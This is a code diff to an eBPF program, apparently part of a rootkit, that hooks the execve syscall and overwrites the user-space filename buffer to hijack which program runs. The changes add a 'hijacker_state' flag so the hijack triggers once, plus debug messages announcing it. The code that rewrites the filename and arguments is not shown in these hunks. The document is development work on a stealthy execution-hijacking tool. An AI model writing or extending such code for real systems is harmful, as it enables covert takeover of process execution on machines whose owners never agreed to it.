@@ -28,6 +28,8 @@ struct sys_execve_enter_ctx {
     const char* const* envp;
 };
 
+volatile int hijacker_state = 0;
+
 /**
  * @brief Checks for the error case 2 described in the execve handler when overwriting the filename userspace buffer.
  * 
@@ -84,6 +86,12 @@ static __always_inline int test_write_user_unique(struct sys_execve_enter_ctx *c
 }
 
 static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ctx *ctx, __u64 pid_tgid){
+    //Check if the exec hijacker is active already
+    if(hijacker_state == 1){
+        return 0;
+    }
+    bpf_printk("Starting execve hijacker\n");
+    
     unsigned char* argv[NUMBER_ARGUMENTS_PARSED] = {0};
     //unsigned char* envp[PROGRAM_LENGTH] = {0};
     unsigned char filename[ARGUMENT_LENGTH] = {0};
@@ -160,6 +168,9 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
         //bpf_printk("ARGV2: %s\n", argv[2]);
         return -1;
     }
+     
+    bpf_printk("One success\n");
+    hijacker_state = 1;
 
     unsigned char newfilename[ARGUMENT_LENGTH] = {0};
     unsigned char* newargv[NUMBER_ARGUMENTS_PARSED] = {0};
